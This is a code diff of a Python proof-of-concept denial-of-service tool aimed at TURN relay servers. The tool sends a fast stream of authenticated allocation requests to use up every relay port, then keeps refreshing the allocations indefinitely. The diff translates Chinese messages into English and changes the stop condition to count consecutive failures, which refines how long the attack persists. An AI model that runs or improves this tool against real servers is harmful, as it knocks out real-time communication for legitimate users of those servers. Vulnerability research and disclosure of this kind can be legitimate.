@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-TURN DoS攻击POC - 攻击1：短时间发送n个allocation请求，占满所有可申请的中继端口
+TURN DoS Attack POC - Attack 1: Send n allocation requests in a short time to exhaust all available relay ports
 """
 
 import socket
@@ -55,6 +55,7 @@ stats = {
     'active_allocations': 0,
     'errors': defaultdict(int),
     'error_486_count': 0,  # 486错误计数
+    'consecutive_failures': 0,  # 连续失败计数
 }
 stats_lock = threading.Lock()
 
@@ -641,6 +642,8 @@ def attempt_allocation(server_address, username, password, realm, server_hostnam
             with stats_lock:
                 stats['successful_allocations'] += 1
                 stats['active_allocations'] = len(active_allocations)
+                # 成功时重置连续失败计数
+                stats['consecutive_failures'] = 0
             
             print(f"[+] Allocation #{allocation_id} successful (Local port: {local_port}, Total: {stats['successful_allocations']}/{stats['total_requests']})")
             return True, allocation_info, None
@@ -674,7 +677,9 @@ def attempt_allocation(server_address, username, password, realm, server_hostnam
                         if error_code_value == 486:  # Allocation Quota Reached
                             with stats_lock:
                                 stats['error_486_count'] += 1
-                            print(f"[-] Allocation #{allocation_id} failed: 486 Allocation Quota Reached (Total 486: {stats['error_486_count']})")
+                                # 增加连续失败计数
+                                stats['consecutive_failures'] += 1
+                            print(f"[-] Allocation #{allocation_id} failed: 486 Allocation Quota Reached (Total 486: {stats['error_486_count']}, Consecutive failures: {stats['consecutive_failures']})")
                             check_sock.close()
                             # 释放端口
                             if local_port is not None:
@@ -692,8 +697,10 @@ def attempt_allocation(server_address, username, password, realm, server_hostnam
             with stats_lock:
                 stats['failed_allocations'] += 1
                 stats['errors']['allocation_failed'] += 1
+                # 增加连续失败计数
+                stats['consecutive_failures'] += 1
             
-            print(f"[-] Allocation #{allocation_id} failed (local port: {local_port}, Total: {stats['failed_allocations']}/{stats['total_requests']})")
+            print(f"[-] Allocation #{allocation_id} failed (local port: {local_port}, Total: {stats['failed_allocations']}/{stats['total_requests']}, Consecutive failures: {stats['consecutive_failures']})")
             return False, None, None
     
     except Exception as e:
@@ -701,60 +708,62 @@ def attempt_allocation(server_address, username, password, realm, server_hostnam
         with stats_lock:
             stats['failed_allocations'] += 1
             stats['errors'][error_msg] += 1
+            # 增加连续失败计数
+            stats['consecutive_failures'] += 1
         
         # 确保在异常情况下也释放端口
         if local_port is not None:
             release_port(local_port)
         
-        print(f"[-] Allocation #{allocation_id} error: {error_msg}")
+        print(f"[-] Allocation #{allocation_id} error: {error_msg} (Consecutive failures: {stats['consecutive_failures']})")
         return False, None, None
 
 def print_stats():
-    """打印统计信息"""
+    """Print statistics"""
     with stats_lock:
         print("\n" + "="*70)
-        print("📊 攻击统计")
+        print("📊 Attack Statistics")
         print("="*70)
-        print(f"总请求数: {stats['total_requests']}")
-        print(f"成功分配: {stats['successful_allocations']}")
-        print(f"失败分配: {stats['failed_allocations']}")
-        print(f"活跃分配: {stats['active_allocations']}")
+        print(f"Total Requests: {stats['total_requests']}")
+        print(f"Successful Allocations: {stats['successful_allocations']}")
+        print(f"Failed Allocations: {stats['failed_allocations']}")
+        print(f"Active Allocations: {stats['active_allocations']}")
         if stats['errors']:
-            print("\n错误统计:")
+            print("\nError Statistics:")
             for error, count in stats['errors'].items():
                 print(f"  {error}: {count}")
     
-    # 打印中继端口统计
+    # Print relay port statistics
     with relayed_ports_lock:
-        print(f"\n中继端口统计:")
-        print(f"  唯一中继端口数: {len(allocated_relayed_ports)}")
-        print(f"  重复中继端口数: {len(relayed_port_duplicates)}")
+        print(f"\nRelayed Port Statistics:")
+        print(f"  Unique Relayed Ports: {len(allocated_relayed_ports)}")
+        print(f"  Duplicate Relayed Ports: {len(relayed_port_duplicates)}")
         if relayed_port_duplicates:
-            print(f"\n重复中继端口详情（最近10个）:")
-            for dup in relayed_port_duplicates[-10:]:  # 只显示最近10个
+            print(f"\nDuplicate Relayed Port Details (Last 10):")
+            for dup in relayed_port_duplicates[-10:]:  # Only show last 10
                 print(f"  Local port: {dup['local_port']}, Relayed: {dup['relayed_ip']}:{dup['relayed_port']}")
     
     print("="*70 + "\n")
 
 def main():
-    parser = argparse.ArgumentParser(description='TURN DoS攻击POC - 攻击1：持续占满所有可申请的中继端口')
-    parser.add_argument('--turn-server', required=True, help='TURN服务器地址（域名或IP）')
-    parser.add_argument('--turn-port', type=int, help='TURN服务器端口')
-    parser.add_argument('--username', required=True, help='TURN服务器用户名')
-    parser.add_argument('--password', required=True, help='TURN服务器密码')
-    parser.add_argument('--realm', help='TURN服务器认证域')
-    parser.add_argument('--concurrent', type=int, default=10, help='并发请求数（默认: 10）')
-    parser.add_argument('--refresh-interval', type=int, default=300, help='Refresh间隔（秒，默认: 300）')
-    parser.add_argument('--monitor-interval', type=int, default=5, help='统计信息打印间隔（秒，默认: 5）')
-    parser.add_argument('--failure-threshold', dest='failure_threshold', type=int, default=100, help='失败分配阈值，超过此值停止新分配（默认: 100）')
+    parser = argparse.ArgumentParser(description='TURN DoS Attack POC - Attack 1: Continuously exhaust all available relay ports')
+    parser.add_argument('--turn-server', required=True, help='TURN server address (hostname or IP)')
+    parser.add_argument('--turn-port', type=int, help='TURN server port')
+    parser.add_argument('--username', required=True, help='TURN server username')
+    parser.add_argument('--password', required=True, help='TURN server password')
+    parser.add_argument('--realm', help='TURN server authentication realm')
+    parser.add_argument('--concurrent', type=int, default=10, help='Concurrent requests (default: 10)')
+    parser.add_argument('--refresh-interval', type=int, default=300, help='Refresh interval (seconds, default: 300)')
+    parser.add_argument('--monitor-interval', type=int, default=5, help='Statistics print interval (seconds, default: 5)')
+    parser.add_argument('--failure-threshold', dest='failure_threshold', type=int, default=100, help='Failure threshold, stop new allocations when exceeded (default: 100)')
     
     args = parser.parse_args()
     
     print("="*70)
-    print("🚨 TURN DoS攻击POC - 攻击1（持续模式）")
+    print("🚨 TURN DoS Attack POC - Attack 1 (Continuous Mode)")
     print("="*70)
     
-    # 解析TURN服务器地址
+    # Resolve TURN server address
     server_address = resolve_server_address(args.turn_server, args.turn_port or DEFAULT_TURN_PORT)
     if not server_address:
         print("[-] Failed to resolve TURN server address")
@@ -762,10 +771,10 @@ def main():
     
     print(f"[+] TURN Server: {server_address}")
     print(f"[+] Username: {args.username}")
-    print(f"[+] 并发数: {args.concurrent}")
-    print(f"[+] Refresh间隔: {args.refresh_interval}秒")
-    print(f"[+] 失败分配阈值: {args.failure_threshold}（累计{args.failure_threshold}次失败后停止新分配）")
-    print(f"[+] 模式: 持续allocate直到累计{args.failure_threshold}次失败，然后持续refresh")
+    print(f"[+] Concurrent: {args.concurrent}")
+    print(f"[+] Refresh Interval: {args.refresh_interval} seconds")
+    print(f"[+] Failure Threshold: {args.failure_threshold} (stop new allocations after {args.failure_threshold} consecutive failures)")
+    print(f"[+] Mode: Continue allocating until {args.failure_threshold} consecutive failures, then continue refreshing")
     print()
     
     # 启动统计信息监控线程
@@ -797,16 +806,16 @@ def main():
                 # 检查是否应该继续allocate
                 with should_continue_lock:
                     if not should_continue_allocating:
-                        print("[!] 已达到失败分配阈值，停止发送新的allocation请求")
-                        print("[!] 将继续refresh已有的allocation...")
+                        print("[!] Failure threshold reached, stopping new allocation requests")
+                        print("[!] Will continue refreshing existing allocations...")
                         break
                 
-                # 检查失败分配计数
+                # 检查连续失败计数
                 with stats_lock:
-                    if stats['failed_allocations'] >= args.failure_threshold:
+                    if stats['consecutive_failures'] >= args.failure_threshold:
                         with should_continue_lock:
                             should_continue_allocating = False
-                        print(f"[!] 检测到累计{stats['failed_allocations']}次失败分配，达到阈值{args.failure_threshold}，停止新分配")
+                        print(f"[!] Detected {stats['consecutive_failures']} consecutive failed allocations, reached threshold {args.failure_threshold}, stopping new allocations")
                         break
                 
                 # 提交新的allocation请求
@@ -839,19 +848,19 @@ def main():
                                 args.refresh_interval
                             )
                         
-                        # 检查是否达到失败阈值
+                        # 检查是否达到连续失败阈值
                         with stats_lock:
-                            if stats['failed_allocations'] >= args.failure_threshold:
+                            if stats['consecutive_failures'] >= args.failure_threshold:
                                 with should_continue_lock:
                                     should_continue_allocating = False
                     except Exception as e:
-                        print(f"[!] 处理allocation结果时出错: {e}")
+                        print(f"[!] Error processing allocation result: {e}")
                 
                 # 短暂延迟，避免请求过快
                 time.sleep(0.01)
             
             # 等待所有pending请求完成
-            print("[+] 等待所有pending请求完成...")
+            print("[+] Waiting for all pending requests to complete...")
             for future in pending_futures:
                 try:
                     success, allocation_info, error_code = future.result()
@@ -864,12 +873,12 @@ def main():
                             args.refresh_interval
                         )
                 except Exception as e:
-                    print(f"[!] 处理pending allocation时出错: {e}")
+                    print(f"[!] Error processing pending allocation: {e}")
     
     except KeyboardInterrupt:
-        print("\n[!] 用户中断")
+        print("\n[!] User interrupted")
     except Exception as e:
-        print(f"\n[-] 错误: {e}")
+        print(f"\n[-] Error: {e}")
         import traceback
         traceback.print_exc()
     finally:
@@ -877,28 +886,28 @@ def main():
         print_stats()
         
         elapsed_time = time.time() - start_time
-        print(f"\n[+] Allocation阶段完成，耗时: {elapsed_time:.2f}秒")
-        print(f"[+] 成功分配: {stats['successful_allocations']}/{stats['total_requests']}")
-        print(f"[+] 486错误总数: {stats['error_486_count']}")
-        print(f"[+] 当前活跃分配: {stats['active_allocations']}")
+        print(f"\n[+] Allocation phase completed, elapsed time: {elapsed_time:.2f} seconds")
+        print(f"[+] Successful Allocations: {stats['successful_allocations']}/{stats['total_requests']}")
+        print(f"[+] Total 486 Errors: {stats['error_486_count']}")
+        print(f"[+] Current Active Allocations: {stats['active_allocations']}")
         with relayed_ports_lock:
-            print(f"[+] 唯一中继端口数: {len(allocated_relayed_ports)}")
-            print(f"[+] 重复中继端口数: {len(relayed_port_duplicates)}")
+            print(f"[+] Unique Relayed Ports: {len(allocated_relayed_ports)}")
+            print(f"[+] Duplicate Relayed Ports: {len(relayed_port_duplicates)}")
             if relayed_port_duplicates:
-                print(f"[!] 发现 {len(relayed_port_duplicates)} 个重复的中继端口，这可能表示存在问题")
-        print(f"\n[+] 进入持续refresh模式，allocation将持续刷新...")
-        print(f"[+] 按 Ctrl+C 停止并清理所有allocation")
+                print(f"[!] Found {len(relayed_port_duplicates)} duplicate relayed ports, this may indicate a problem")
+        print(f"\n[+] Entering continuous refresh mode, allocations will be continuously refreshed...")
+        print(f"[+] Press Ctrl+C to stop and clean up all allocations")
         
         try:
             while True:
                 time.sleep(1)
                 with stats_lock:
                     if stats['active_allocations'] == 0:
-                        print("[!] 所有allocation已失效")
+                        print("[!] All allocations have expired")
                         break
         except KeyboardInterrupt:
-            print("\n[!] 用户中断，清理所有allocation...")
-            # 设置停止标志，通知所有refresh线程停止
+            print("\n[!] User interrupted, cleaning up all allocations...")
+            # Set stop flag to notify all refresh threads to stop
             stop_all_refresh.set()
             
             # 清理所有allocation
@@ -914,7 +923,7 @@ def main():
                     except:
                         pass
                 active_allocations.clear()
-            print("[+] 清理完成")
+            print("[+] Cleanup completed")
         
         # 优雅关闭线程池
         try:
@@ -924,7 +933,7 @@ def main():
             # 关闭线程池，不等待所有任务完成（因为可能还在等待refresh_interval）
             keep_alive_executor.shutdown(wait=False)
         except Exception as e:
-            print(f"[!] 关闭线程池时出错: {e}")
+            print(f"[!] Error closing thread pool: {e}")
 
 if __name__ == "__main__":
     main()
